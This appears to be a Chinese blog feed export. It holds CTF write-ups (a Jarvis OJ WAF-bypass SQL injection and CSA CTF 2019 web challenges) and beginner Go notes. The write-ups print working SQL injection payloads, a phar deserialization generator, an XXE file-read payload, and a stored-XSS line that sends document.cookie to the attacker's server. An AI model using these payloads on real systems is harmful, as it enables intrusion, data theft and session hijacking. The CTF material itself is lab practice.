浮点数和科学计数法代替空格，当与from相邻的查询参数是数字时可用 特殊字符，这里经测试只有{},(),””,’’,&#96;加字母可用 位置5——from之后的空格 注释和mysql内联注释代替空格可用，此处就不截图了。 mysql里的空白字符，与上面一样，此处不截图 浮点数和科学计数法代替空格不可用 特殊字符，经测试&#96;,{},()可用 实战应用感觉上面总结的挺垃圾的，想搞个实例再详细写一下，刚好在Jarvis OJ做到一题SQL注入绕过WAF，于是就拿来分析一下。 题目描述: 题目名称：In A Mess连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。题目入口：http://web.jarvisoj.com:32780/ 题目一进去，查看源码得到提示，访问index.phps文件 访问index.phps文件，得到一份源码123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; 从上面代码的第4行和刚刚index.php页面源码截图来看，很容易推测出，这份代码是index.php的源码。 而这里源码的漏洞和之前Bugku上一题类似，id利用弱类型比较,data利用php://input,b利用ereg的00截断进行绕过如下图,这里就不细讲了，毕竟重头戏是SQL注入。 绕过上面那关之后，可以看到有一个地址^HT2mCpcvOLf,继续访问。 经测试，当将id改为1之外的数的话，会直接显示sql语句 把id改为2-1,会回显hi666，说明id是整数型，这里可注入。 然后尝试进行注入，但是发现当输入注入语句，会回显you bad boy/girl! 结合三种回显，可以梳理一下逻辑。当id存在于服务器数据库时，回显表中的内容，当id不在服务器数据库里时(或者执行出错)，回显sql语句，当检测到注入时，回显you bad boy/girl!。 说明有waf，存在过滤，经测试，在id后输入空格即会被检测成注入(位置1)。于是可以采用上述的空格绕过姿势进行尝试。经测试，发现id和union之间的空格可以用/&#42;1*/或者浮点数、科学计数法等绕过，而内联注释，和空注释会被检测。图为用浮点数绕过空格，但是输入了union却发现回显语句没有union，说明union等关键字被替换成空了。 于是输入要用到的sql关键词，看看回显结果，输入id=2.2union;select;and;from;or,回显结果如下图。可以看到，除了and和or，其余关键词都被替换为空了。这里尝试一下双写、大小写绕过，发现双写和大小写都可以。 解决了id和union直接的空格和关键词过滤后，然后再进一步进行sql注入。 然后发现union和select之间(位置2)要是存在空格的话,空格及后面的内容会被替换为空。 所以这里用到我们在位置2处测试的替换空格方案进行绕过，我测试时用到%0b,/&#42;1*/可以绕过此处空格 然后从上图又发现select和查询参数间空格(位置3)及以后的内容会被替换成功，于是采用我们上面在位置3处分析总结的方法进行尝试，最后发现%0b,%0c可以进行替换，而/&#42;1*/会被检测出注入。 于是用%0b替换select和查询参数间的空格，然后继续注入，逐步增加select后面的数字，发现加到3的时候，页面回显变为了3。。到这里已经看到了成功的希望(2333) 知道3字段位置有回显，然后利用这个字段进行查询。然后再进一步测试，然后发现，只要有空格就会把空格及空格后面的内容置换为空。这里懒得截图了，反正一步步测试下来，发现后面空格都可以用%0b绕过。 这里就跳过后续空格测试验证过程了。直接爆表，payload:id=2.2Union/*1*/%0bSelect%0b1,2,group_concat(table_name)%0bFrom%0binformation_schema.tables%0bwhere%0btable_schema=database() 得到表名content。 然后爆列，payload:id=2.2Union/*1*/%0bSelect%0b1,2,group_concat(column_name)%0bFrom%0binformation_schema.columns%0bwhere%0btable_schema=database() 得到列名id,context,title 然后爆值，payload:id=2.2Union/*1*/%0bSelect%0b1,2,group_concat(id,context,title)%0bFrom%0bcontent 得到flag:PCTF{Fin4lly_U_got_i7_C0ngRatulation5} 参考WAF Bypass数据库特性（Mysql探索篇）]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Mysql</tag>
        <tag>Bypass</tag>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSA CTF 2019 Web Write up]]></title>
    <url>%2FCTF%2FCSA-CTF-2019%2FCSA-CTF-2019-Web-Write-up.html</url>
    <content type="text"><![CDATA[在ctftime上面报了一个国外大学(UTSA)的CTF，虽然好像只有两个人维护，但是题目还是挺多的，题目比较简单，适合新手做做。我用了几个小时，把Web题全看了，然后做了能做出来的，其他题试了试，现在比赛结束了，趁着环境还在，赶紧记录下。 前言Web题共6道，还是比较简单的。除去签到题外我搞出了三道，其中一道还是1血，2333。剩余三道有两道有思路，但是当时差一点点没弄出来。剩下一道就是完全下手不动。这里放一张当时的截图 这个图是做出两道来后排26，后面又做出一道，排到了22，但是他这个是动态分数，题目越多人做出来分值就降。。以至于后面结束比赛后，降到了106(2333) CSA Database 1 - Suspicious member题目描述: We have a suspicious user in our system. See if you can find him.http://35.231.36.102:1776 本来之前做一些数据库的题目被搞自闭了，以至于现在看到数据库题目莫名害怕，但是这个比赛两道数据库的题都挺简单，虽然挺常规的，不过搞出来心情还是不错的。 题目进去是一个输ID查用户的页面 分别输入1、1&#39;、1&quot;进行测试，发现输入1、1&#39;返回正常查询结果 输入1&quot;返回 0 Result，说明&quot;影响了SQL查询语句。 然后我们进一步输入1&quot; #测试，返回正常，由此判断此处存在SQL注入点 然后通过order by探测出有4个字段。再用1&quot; and 1=2 union select 1,2,3,4#看看网页是否有回显，如下图示，发现1、2、3、4四个字段都可用来回显信息。于是用union查询进行爆表爆列爆表payload:1&quot; and 1=2 union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2,3,4# 得到表名:csa_officers爆列payload:1&quot; and 1=2 union select (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;csa_officers&#39;),2,3,4#得到列名有:id,username,password,email,name 看题目描述说到有一个suspicious user，于是爆usernamepayload:1&quot; and 1=2 union select (select group_concat(username) from csa_officers),2,3,4# 得到username列表：alix,blue,boon,can,core,eli,flag,herro,luca,missing,niko,thor,ware 看到flag了，于是再进一步查flag的信息payload:1&quot; and 1=2 union select (select concat(id,&#39;:&#39;,username,&#39;:&#39;,password,&#39;:&#39;,email) from csa_officers where username=&#39;flag&#39;),2,3,4#得到:13371773:flag::CSACTF{0i_0i_Wh0_1s_th1s_guys?} CSA Database 2 - Darkest Secret题目描述: One of our officers is having a dark secret. Can you reveal it?http://35.231.36.102:1777 题目点进去跟上一题差不多。 通过测试，发现也是用双引号闭合注入。和上一题差不多的做法，到了爆列这一步，通过上题的爆列payload，得到它的所有列 到这里结合题目描述中的dark secret，这里应该是flag在darkeest_secret列处。于是这里payload为1&quot; and 1=2 union select (select group_concat(darkest_secret) from csa_officers),2,3,4# 爆出flag 这里再说一下，本来我是用···select darkest_secret from csa_officers limit &lt;n&gt;,1···进行查的，然后发现啥东西也没查出来，还以为自己写错了语句，于是卡了一会，后面才想到，可能它放了几个空值，于是改用group_concat。 Huzzah题目描述: http://35.231.36.102:1775/huzzh.php源码附件 12345678910111213141516171819202122232425262728&lt;?phpecho("&lt;html&gt;&lt;head&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"./oldtown.css\"&gt;&lt;/head&gt;");class Magic &#123; function __destruct() &#123; $a = $this-&gt;data; if (strstr($a, ";") !== false or strstr($a, "&amp;") !== false) &#123; echo("&lt;p&gt;[-] That's bad, don't do that" . "&lt;/p&gt;&lt;br&gt;"); &#125; elseif (strcmp($a, "flag.txt") === 0) &#123; echo("&lt;p&gt;[+] Attempting a magic trick!" . "&lt;/p&gt;&lt;br&gt;"); include($a); //eval($this-&gt;data . ";"); &#125; else &#123; echo("&lt;p&gt;[-] You gave bad input - " . $a . "&lt;/p&gt;&lt;br&gt;"); &#125; system("rm uploads/magic.phar"); &#125;&#125;include('phar://uploads/magic.phar');//echo(file_exists("phar://uploads/magic.phar"));echo("&lt;a id=\"huzzah\" href=\"index.html\"&gt;GO BACK --&lt;/a&gt;");?&gt; 源码看了一下，发现有一个Magic类，里面还有一个析构函数，析构函数里还有一步读flag.txt的过程，于是猜测跟反序列化相关。除此之外还有phar://、include函数，源码先简单分析到这。然后点进题目去，是一个文件上传页面 先分析一下这个文件上传页面，一个选择文件按钮，一个upload file提交按钮，另外upload file提交按钮下面那个蓝色的HUZZAH是一个跳转链接，指向/huzzah.php 分析完后，先上传一个文件1.php测试一下。发现提示说文件名字不是magic.phar,文件上传失败。 这个magic.phar看着眼熟，于是搜索一波phar。在先知找到一篇: Phar的一些利用姿势里面写到，phar可以实现反序列化漏洞。 在不使用unserialize()函数的情况下触发PHP反序列化漏洞。漏洞触发是利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。 恍然大悟，于是利用php代码，生成phar文件进行反序列化，把Magic类里的$data赋为flag.txt。生成phar代码如下脚本运行条件: php.ini中必须设置phar.readonly=Off，不然Phar文件就会无法生成。12345678910111213&lt;?phpclass Magic &#123; public $data = "flag.txt";&#125;$phar = new Phar("magic.phar");$phar-&gt;startBuffering();$phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;");//设置stub$o = new Magic();$phar-&gt;setMetaData($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件$phar-&gt;stopBuffering(); //自动计算签名?&gt; 利用这个php脚本生成magic.phar，然后上传。得到flag 下面就是我没做出来的题了。 The Outer Space题目描述: Our new authentication portal was just launched. Is it secured?http://35.231.36.102:1774/ 题目进去如下图示 一进去是XML，很容易联想到XXE。于是构造XXE payload进行尝试。几番测试下来，发现必须要有下面字段，页面才会有回显。1234&lt;creds&gt; &lt;user&gt;username&lt;/user&gt; &lt;pass&gt;password&lt;/pass&gt;&lt;/creds&gt; 于是想到用xxe读源码，通过user或者pass标签回显。于是构造payload如下1234567&lt;!DOCTYPE miracle [&lt;!ENTITY miracle SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php"&gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;miracle;&lt;/user&gt; &lt;pass&gt;pass&lt;/pass&gt;&lt;/creds&gt; 这里必须吐槽一下，我特么读的时候读的index.php，结果回显当时还以为这题不是这样做，需要用到外部dtd，233mdzz，当时也没多想，赶着玩游戏，于是就没有深究下去了。 今天看了别人的wp后才发现，是读xxe.php，将xxe的源码base64解密后如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?php /** * This funtion will take a pattern and a folder as the argument and go thru it(recursivly if needed)and return the list of * all files in that folder. * Link : http://www.bin-co.com/php/scripts/filesystem/ls/ * Arguments : $pattern - The pattern to look out for [OPTIONAL] * $folder - The path of the directory of which's directory list you want [OPTIONAL] * $recursivly - The funtion will traverse the folder tree recursivly if this is true. Defaults to false. [OPTIONAL] * $options - An array of values 'return_files' or 'return_folders' or both * Returns : A flat list with the path of all the files(no folders) that matches the condition given. */ function ls($pattern="*", $folder="", $recursivly=false, $options=array('return_files','return_folders')) &#123; if($folder) &#123; $current_folder = realpath('.'); if(in_array('quiet', $options)) &#123; // If quiet is on, we will suppress the 'no such folder' error if(!file_exists($folder)) return array(); &#125; if(!chdir($folder)) return array(); &#125; $get_files = in_array('return_files', $options); $get_folders= in_array('return_folders', $options); $both = array(); $folders = array(); // Get the all files and folders in the given directory. if($get_files) $both = glob($pattern, GLOB_BRACE + GLOB_MARK); if($recursivly or $get_folders) $folders = glob("*", GLOB_ONLYDIR + GLOB_MARK); //If a pattern is specified, make sure even the folders match that pattern. $matching_folders = array(); if($pattern !== '*') $matching_folders = glob($pattern, GLOB_ONLYDIR + GLOB_MARK); //Get just the files by removing the folders from the list of all files. $all = array_values(array_diff($both,$folders)); if($recursivly or $get_folders) &#123; foreach ($folders as $this_folder) &#123; if($get_folders) &#123; //If a pattern is specified, make sure even the folders match that pattern. if($pattern !== '*') &#123; if(in_array($this_folder, $matching_folders)) array_push($all, $this_folder); &#125; else array_push($all, $this_folder); &#125; if($recursivly) &#123; // Continue calling this function for all the folders $deep_items = ls($pattern, $this_folder, $recursivly, $options); # :RECURSION: foreach ($deep_items as $item) &#123; array_push($all, $this_folder . $item); &#125; &#125; &#125; &#125; if($folder) chdir($current_folder); return $all; &#125; libxml_disable_entity_loader (false); $xmlfile = $_POST['body']; //file_get_contents('php://input'); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $user = $creds-&gt;user; $pass = $creds-&gt;pass; echo "&lt;html&gt; &lt;head&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"./countrylane.css\"&gt;&lt;/head&gt;"; if ($user == "admin") &#123; if ($pass == "0e1234") &#123; echo "&lt;p&gt; The creds [ $user : $pass ] were correct! &lt;/p&gt;"; echo "&lt;br&gt;"; print("&lt;p&gt; You won the directory listing! &lt;/p&gt;"); echo "&lt;br&gt;"; $listing = ls("*"); echo "&lt;p&gt;"; print_r($listing); echo "&lt;/p&gt;"; &#125; else &#123; echo "Wrong password [ $user : $pass ]"; &#125; &#125; else &#123; echo "&lt;p&gt; Wrong creds [ $user : $pass ] &lt;/p&gt;"; &#125;?&gt; 从上面源码可以看到，user为admin、pass为0e1234，用下面xml提交后1234&lt;creds&gt; &lt;user&gt;admin&lt;/user&gt; &lt;pass&gt;0e1234&lt;/pass&gt;&lt;/creds&gt; 由上图可知，服务器上的文件分布，有flag.txt，此外index是index.html不是index.php,当时真是傻逼 于是访问flag.txt，然后居然403， 感觉这个403没什么卵用呀。之前xxe payload可以读文件，把之前payload改改，读出flag.txt的base64 解码的flag：CSACTF{1_d0nt_kn0w_wh4t_t0_put_h3r3_lm40} 这里需要再说一下，这个输入框显示是都显示大写，其实还是区分大小写的，稍微有一个字符大小写搞错都出不来，那天可能是因为我那个字母打错了吧，不然我应该会index.php和index.html都试一下的呀。小小总结一下，以后这种题，还是文本编辑器里写好，然后再提交吧，争取不犯低级错误。 CSA Portal题目描述: Are you a member of CSA yet? Sign uphere: http://35.231.36.102:1779/ 链接进去后是一个登录、注册框。(看来有必要什么时候攻一下登录框类的题了。)。 注册登录后是一个留言框 当时自己做的时候，怀疑是XSS，但是因为XSS题目没做过什么，有点无从下手，居然以为是在上图中的Welcome &lt;username&gt;处xss。后面试了一会发现并没有什么卵用。然后放弃了(游戏害人呀) 后面看了write up，发现是在留言框里进行XSS。这应该算个存储型XSS。说下具体过程吧。首先打开Burp，抓包分析。发现，登录页面login.php、登录成功页面welcome.php都用到了同一个cookie。 这里就应该想到，通过XSS搞到admin的cookie，然后通过改cookie以管理员身份登录。不过这里是个没有回显的XSS，于是就要用到自己的服务器了。 先在自己的vps上开启一个服务器，可以记录访问日志的那种，直接用Apache访问80端口也行。。我这里用的是之前做DDCTF一道题目里给的一个python服务器，刚好能返回访问记录，再加上我把我的安全组80端口关了，于是就懒得用Apache了。 直接开启python服务器，监听8123端口 然后回到我们正常注册的用户的留言界面，进行留言留言内容为:&lt;script&gt;location.href = &quot;http://&lt;your server ip&gt;/?&quot;+document.cookie&lt;/script&gt; 这里留言界面说到，管理员一会儿会check them，他promise了。。。所以我们提交完后，回到脚本处等它访问。 过了一小段时间，果然出现了访问记录 于是把这个cookie复制下来，直接放进welcome.php里，得到flag 这里要再说一下，cookie是有时间限制的，好像几分钟就没了把。所以得到cookie后要赶快登陆获取flag。不然就会得到302错误。 Biscuits Shop题目描述: Get your biscuits today:http://35.231.36.102:1773/ 题目进去如下图 简单分析一下，有注册、登陆页面，还有三行提示信息，说flag只available for 管理员，请登录后开始你的shopping 当时我自己做的时候，想着是登录成管理员(抱歉，菜逼做题目少，么得思路)，于是自己试了试万能密码不行，约束条件SQL注入不行，于是就理所当然的打游戏去了。。。 现在让我们参考一下别人的wp，看看正确解法是啥吧。好吧，看了一圈下来，网上就找到两个这题的wp，一个日本的兄dui，直接用admin=去注册就出来了，另一个英语有口音的人放了个youtube视频还特么没有英语字幕，里面是用BurpSuite爆破一个32位没得规律的cookie，视频里面她也没放出整个爆破过程，就最后复制粘贴了一段正确的admin的cookie，再加上么得字幕，我也不知道她怎么做出来的。。。。 两个wp好像都没什么用。。于是只能自己瞎写一个了。 申明一下，下面纯属瞎扯。 我们打开注册页面，用一个正常的用户名注册，发现注册成功后会自动登录 然后下面用admin注册试试。当然是不可能正常注册的，用admin加空格尝试约束注入攻击也失败了。 于是没得什么法子，只能破罐破摔，再试一个admin&#39; or 1=1#，结果发现出现一个不一样的结果。如上图，他提示说user not found：admin’ or 1，明明我们用的是admin&#39; or 1=1#注册的，怎么就变成admin&#39; or 1呢了。其实那天自己做的时候，试到了这一步，不过当时没怎么注意，只是以为admin&#39; or 1=1#这条路走不通，然后玩游戏去了。 结合那位日本小哥的wp来看，现在才发现，这里其实另有玄机，他这里直接出现了User not found，而且界面也是注册成功后登陆的界面，说明他通过了注册，尝试了登录，但是返回页面从数据库里找user的时候找不到admin&#39; or 1,所以提示user not found。 这里可以猜测，它应该是用admin&#39; or 1=1#注册且登录成功了，但是页面返回结果后台的sql查询语句(可能是)：where username = xxx,被=影响了。然后再结合输入的是admin&#39; or 1=1#,界面回显结果是未找到useradmin&#39; or 1，=及后面的字符串消失了，于是可以想到用admin=xxxxxx进行注册登录，然后页面进行查询的时候会用admin做查询，返回admin的信息。 为了证实这个猜想，我们先用admin2进行注册。 然后再用admin2=miracle778注册，结果页面返回如下图，证明猜想 于是可以用admin=miracle778进行注册登录，绕过admin已存在的限制，然后登录成功后的index.php用到的查询语句把=及=后面的字符串都忽略了，从而查询admin的数据库信息并返回。]]></content>
      <categories>
        <category>CTF</category>
        <category>CSA CTF 2019</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>CSA CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go web编程学习（一）]]></title>
    <url>%2FStudy%2FGo%2FGo-web%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
    <content type="text"><![CDATA[关于Go语言Web编程的一些学习笔记，这是第一篇，主要是粗略过一遍Go语言语法，后面会写Go web编程的一些东西。 前言不知道什么时候开始，整个人变得浮躁起来，沉不下心来学东西。其实早就想静下心来学点东西了，比如说Go语言、Java spring等，所以这次趁着五一小长假，来学习一波。 环境这次学习我主要是用一本书，名字叫Go Web编程，在Gitbook上，是一本开源书籍。Go Web编程编译器我用的是: Visual Studio Code 2017Go的版本是: go1.11.5 windows/amd64 话不多说，开始学吧。 Go关键字Go是一门类似C的编译型语言，但是它的编译速度非常快。这门语言的关键字总共二十五个，把这二十五个关键字用会，Go语言差不多就入门了吧。二十五个关键字如下:12345break default func interface selectcase defer go map structchan else goto package switchconst fallthrough if range typecontinue for import return var Go包机制理解先从hello world讲起。先创建一个hello.go1234567package mainimport "fmt"func main() &#123; fmt.Printf("Hello, world or 你好，世界 or καλημ ́ρα κóσμ or こんにちはせかい\n")&#125; 这段程序输出如下：Hello, world or 你好，世界 or καλημ ́ρα κóσμ or こんにちはせかい 现在来分析一下这段代码 看到第一行package main 归纳一下就是package 遵从以下规则。 package是最基本的分发单位和工程管理中依赖关系的体现 每个Go语言源代码文件开头都必须要有一个package声明，表示源代码文件所属包 要生成Go语言可执行程序，必须要有名为main的package包，且在该包下必须有且只有一个main函数 同一个路径下只能存在一个package，一个package可以由多个源代码文件组成 这个package机制还是要搞懂一下的，不然程序运行起来莫名出错。这里我也不知道该怎么表达清楚(水平有限233)，只能放两个例子帮助大家理解。第一个例子: 生成使用自己的package在GOPATH\src目录下，新建test文件夹，test文件夹里新建test.go1234567package testimport "fmt"func Test() &#123; fmt.Printf("this is package test test.go\n")&#125; 注意，这里第一行是package test,说明这是一个包文件，它有一个函数命名是Test，首字母大写了，这里说明一下，在Go语言里，有一个简单的规则:如果一个名字是大写字母开头的，那么该名字是导出的（汉字不区分大小写，因此汉字开头的名字是没有导出的）。 这是一个简单的包文件，命令行在test文件夹下输入 go install即可编译生成test.a包文件。然后就能在别的go程序里使用它了。如在GOPATH\src\hello文件夹下main.go文件中导入调用该包及其Test()函数。 第二个例子: 同一目录下的多文件package在GOPATH\src\hello文件夹下，创建两个文件，分别是main.go、hello.go代码分别如下main.go12345678910111213141516package mainimport ( "fmt" "test")func test1() &#123; fmt.Printf("Hello, world or 你好，世界 or καλημ ́ρα κóσμ or こんにちはせかい\n")&#125;func main() &#123; test.Test() test1() hello()&#125; hello.go1234567package mainimport "fmt"func hello() &#123; fmt.Printf("hello, this is hello.go\n")&#125; 这里main.go程序下调用了hello.go里的函数，这里的hello.go类似于C中的.h文件，我们可以命令行在hello文件夹内输入go build .,以此生成hello.exe，然后执行。可以看到，生成的hello.exe执行能调用hello.go里的函数，这是同一路径多文件package的情况。 Go基础变量类型这里讲讲定义变量、常量、Go内置类型以及Go程序设计中的一些技巧。Go语言的数据类型有整型:uint8、uint16、uint32、uint64、int8、int16、int32、int64 浮点数:float32、float64 复数:complex64、complex128分别对应float32、float64两种浮点数精度内置的complex函数用来构建复数，内置的real、imag函数分别返回复数的实部和虚部1234var x complex128 = complex(1,2) //1+2ivar y complex128 = complex(3,4) //3+4ifmt.Println(real(x*y)) //-5fmt.Println(imag(x*y)) //10 布尔型：只能是true、false 字符串：字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。用双引号&quot;&quot;或反引号&#96;&#96;定义，反引号可用于定义多行字符串类型是string。具有len方法、切片、+号连接等操作使用var声明方法：var s string = &quot;miracle778&quot; 字符串是不可修改的，如果非要修改的话，可以先转为byte数组，然后再更改需要改的单位字符。如下图 错误类型：errorGo内置有一个error类型，专门用来处理错误信息，Go的package里面还专门有一个包errors来处理错误 其他类型如iota枚举类型，就不讲了，用的时候网上找找就好了。 变量定义方式一般声明，使用var &lt;变量名&gt; &lt;变量类型&gt;进行声明如:12var str string = "字符串" //字符串变量var num uint32 = 77777 //uint32类型变量 简短声明，使用&lt;变量名&gt;:=&lt;表达式&gt;来声明初始化变量。它会根据表达式自动推导变量的类型。因为简短灵活的特点，简短变量声明被广泛用于大部分的局部变量声明和初始化。而var形式的声明往往适用于需要显示指明变量类型的地方，或者因为变量稍后会被重新赋值而初始值无关紧要的地方 变量定义方式可以一次定义多个变量，like pythonvar a,b,c int = 1,2,3a,b,c := 1,2,3 变量要注意的点 下划线_是个特殊的变量名，任何赋予它的值都会被丢弃如:_,a = 7,8 这里将8赋给a，并同时丢弃7 Go对于已声明但未使用的变量会在编译阶段报错 Go语言的一些默认规则 大写字母开头的变量是可导出的，也就是其它包可以读取的，是公用变量；小写字母开头的就是不可导出的，是私有变量。 大写字母开头的函数也是一样，相当于class中的带public关键词的公有函数；小写字母开头的就是有private关键词的私有函数。 Array 数组数组定义方式 var声明 var &lt;name&gt; [length]&lt;type&gt;如：var arr [7]int通过var声明后，数组各项元素默认为0或空通过var声明并初始化var arr = [4]string{&quot;a&quot;,&quot;b&quot;} 简短声明 12345a := [3]int&#123;1, 2, 3&#125; // 声明了一个长度为3的int数组b := [10]int&#123;1, 2, 3&#125; // 声明了一个长度为10的int数组，其中前三个元素初始化为1、2、3，其它默认为0c := [...]int&#123;4, 5, 6&#125; // 可以省略长度而采用`...`的方式，Go会自动根据元素个数来计算长度 数组初始化的时候可以使用索引:值的形式赋值，如下图 二维数组声明1a:=[2][3]int&#123;&#123;1,2&#125;,&#123;3,4,5&#125;&#125; 数组可以像python一样切片 关于数组的一些容易混淆的点 由于长度也是数组类型的一部分，因此[3]int与[4]int是不同的类型，数组也就不能改变长度。数组之间的赋值是值的赋值，即当把一个数组作为参数传入函数的时候，传入的其实是该数组的副本，而不是它的指针。 slice 动态数组slice并不是真正意义上的动态数组，而是一个引用类型。slice总是指向一个底层array，slice的声明也可以像array一样，只是不需要长度。slice var声明举例 var a = []byte{&#39;a&#39;,&#39;b&#39;,&#39;c&#39;},简短声明 a := []int slice可以从一个数组或一个已经存在的slice中再次声明。12345678910111213// 声明一个含有10个元素元素类型为byte的数组var ar = [10]byte &#123;'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'&#125;// 声明两个含有byte的slicevar a, b []byte// a指向数组的第3个元素开始，并到第五个元素结束，a = ar[2:5]//现在a含有的元素: ar[2]、ar[3]和ar[4]// b是数组ar的另一个sliceb = ar[3:5]// b的元素是：ar[3]和ar[4] slice的一些切片操作，跟python类似12345678910111213141516// 声明一个数组var array = [10]byte&#123;'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'&#125;// 声明两个slicevar aSlice, bSlice []byte// 演示一些简便操作aSlice = array[:3] // 等价于aSlice = array[0:3] aSlice包含元素: a,b,caSlice = array[5:] // 等价于aSlice = array[5:10] aSlice包含元素: f,g,h,i,jaSlice = array[:] // 等价于aSlice = array[0:10] 这样aSlice包含了全部的元素// 从slice中获取sliceaSlice = array[3:7] // aSlice包含元素: d,e,f,g，len=4，cap=7bSlice = aSlice[1:3] // bSlice 包含aSlice[1], aSlice[2] 也就是含有: e,fbSlice = aSlice[:3] // bSlice 包含 aSlice[0], aSlice[1], aSlice[2] 也就是含有: d,e,fbSlice = aSlice[0:5] // 对slice的slice可以在cap范围内扩展，此时bSlice包含：d,e,f,g,hbSlice = aSlice[:] // bSlice包含所有aSlice的元素: d,e,f,g slice是引用类型，所以当引用改变其中元素的值时，其它的所有引用都会改变该值，例如上面的aSlice和bSlice，如果修改了aSlice中元素的值，那么bSlice相对应的值也会改变。 对于slice有几个有用的内置函数: len 获取slice的长度 cap 获取slice的最大容量 append 向slice里面追加一个或者多个元素，然后返回一个和slice一样类型的slice copy 函数copy从源slice的src中复制元素到目标dst，并且返回复制的元素的个数 对于上面4个内置函数，len函数自然不用多说，返回slice长度。长度和最大容量之间关系如下图示下面演示下另外三个函数的用法其中特别注意append函数 append函数会改变slice所引用的数组的内容，从而影响到引用同一数组的其它slice。 但当slice中没有剩余空间（即(cap-len) == 0）时，此时将动态分配新的数组空间。返回的slice数组指针将指向这个空间，而原数组的内容将保持不变；其它引用此数组的slice则不受影响。 上面这段话意思如下图示，当b slice使用append添加元素后，如果添加后的长度小于cap最大长度时，原数组中对应位置元素也发生变化。如下面a数组，append函数执行后发生改变。 上面那段话还提到当使用append函数slice没有剩余空间时，此时动态分配新的数组空间，返回的slice数组指针将指向这个空间，原数组内容不变，其他引用原数组的slice不受影响 copy函数主要是切片（slice）的拷贝，不支持数组。将第二个slice里的元素拷贝到第一个slice里，拷贝的长度为两个slice中长度较小的长度值 此外还需介绍下append函数的三种用法。 12slice := append([]int&#123;1,2,3&#125;,4,5,6)fmt.Println(slice) //[1 2 3 4 5 6] 12slice := append([]int&#123;1,2,3&#125;,[]int&#123;4,5,6&#125;...) //末尾记住加三个点fmt.Println(slice) //[1 2 3 4 5 6] 特殊用法，将字符串当作[]byte类型作为第二个参数传入 1bytes := append([]byte("hello"),"world"...) append函数返回值必须要有变量接受，不然会报错 mapmap也就是Python中字典的概念，它的格式为map[keyType]valueType 声明方式 用var声明，使用前需要用make初始化 简单声明 初始化 var dict = map[int]string{0:&quot;miracle&quot;} dict := map[int]string{0:&quot;Miracle778&quot;} 使用map过程中注意下面几点 map是无序的，每次打印出来的map都会不一样，它不能通过index获取，而必须通过key获取 map的长度是不固定的，也就是和slice一样，也是一种引用类型 内置的len函数同样适用于map，返回map拥有的key的数量 map的值可以很方便的修改，通过numbers[“one”]=11可以很容易的把key为one的字典值改为11 map和其他基本型别不同，它不是thread-safe，在多个go-routine存取时，必须使用mutex lock机制 map的初始化可以通过key:val的方式初始化值，同时map内置有判断是否存在key的方式1234567891011// 初始化一个字典rating := map[string]float32&#123;"C":5, "Go":4.5, "Python":4.5, "C++":2 &#125;// map有两个返回值，第二个返回值，如果不存在key，那么ok为false，如果存在ok为truecsharpRating, ok := rating["C#"]if ok &#123; fmt.Println("C# is in the map and its rating is ", csharpRating)&#125; else &#123; fmt.Println("We have no rating associated with C# in the map")&#125;delete(rating, "C") // 删除key为C的元素 上面说过了，map也是一种引用类型，如果两个map同时指向一个底层，那么一个改变，另一个也相应的改变：1234m := make(map[string]string)m["Hello"] = "Bonjour"m1 := mm1["Hello"] = "Salut" // 现在m["hello"]的值已经是Salut了 make、new操作make用于内建类型（map、slice 和channel）的内存分配。new用于各种类型的内存分配。区别是new返回一个指针，make返回引用 内建函数new本质上说跟其它语言中的同名函数功能一样：new(T)分配了零值填充的T类型的内存空间，并且返回其地址，即一个*T类型的值。用Go的术语说，它返回了一个指针，指向新分配的类型T的零值。 内建函数make(T, args)与new(T)有着不同的功能，make只能创建slice、map和channel，并且返回一个有初始值(非零)的T类型，而不是*T。本质来讲，导致这三个类型有所不同的原因是指向数据结构的引用在使用前必须被初始化。例如，一个slice，是一个包含指向数据（内部array）的指针、长度和容量的三项描述符；在这些项目被初始化之前，slice为nil。对于slice、map和channel来说，make初始化了内部的数据结构，填充适当的值。 make两个用法 map 12dict := make(map[int]string)dict[0],dict[1] = "name","passwd" slice 12slice := make([]int,2,6)//返回长度为2 容量为6的slice 下图说明了make、new区别 零值罗列部分类型的零值1234567891011int 0int8 0int32 0int64 0uint 0x0rune 0 //rune的实际类型是 int32byte 0x0 // byte的实际类型是 uint8float32 0 //长度为 4 bytefloat64 0 //长度为 8 bytebool falsestring "" Go流程和函数if语句Go的if语句不需要括号,Go的if还有一个强大的地方就是条件判断语句里面允许声明一个变量，这个变量的作用域只能在该条件逻辑块内，其他地方就不起作用了，如下面代码123456789// 计算获取值x,然后根据x返回的大小，判断是否大于10。if x := computedValue(); x &gt; 10 &#123; 